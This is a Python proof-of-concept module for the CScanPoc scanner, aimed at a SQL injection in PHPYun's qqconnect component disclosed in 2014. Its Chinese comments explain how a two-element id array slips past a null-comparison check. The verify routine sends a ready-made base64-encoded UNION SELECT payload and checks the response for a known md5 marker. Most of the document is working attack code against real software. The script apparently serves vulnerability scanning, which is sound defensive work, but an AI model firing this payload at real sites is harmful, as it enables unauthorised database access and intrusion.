# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPYun_0005'  # 平台漏洞编号，留空
    name = 'PHPYun SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-02-07'  # 漏洞公布时间
    desc = '''
        PHP云人才管理系统，专业的人才招聘网站系统开源程序，采用PHP 和MySQL 数据库构建的高效的人才与企业求职招招聘系统源码。
        在/model/qqconnect.class.php文件中：
        代码从$_GET中获取id参数然后base64解码后按|分隔，其中第0个元素和第1个元素进入了SQL查询，但在此之前有个判断：if($id && is_array($arr) && $arr[0] && $arr[2]==$this->config['coding']){
        这里$this->config['coding']默认为null，当我们只提交两个元素的数组时，$arr[2]也为null，因此$arr[2]==$this->config['coding']，条件成立进入判断所以注入发生。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1235/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPYun'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '271b1804-ee28-4edb-abd3-2296829806ab'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # id是ztz' and 1=2 union select md5(c),2,3,4,5,6,7,8,9;#|ztz的base64编码
            payload = '?M=qqconnect&C=cert&id=enR6JyBhbmQgMT0yIHVuaW9uIHNlbGVjdCBtZDUoYyksMiwzLDQsNSw2LDcsOCw5OyN8enR6'
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
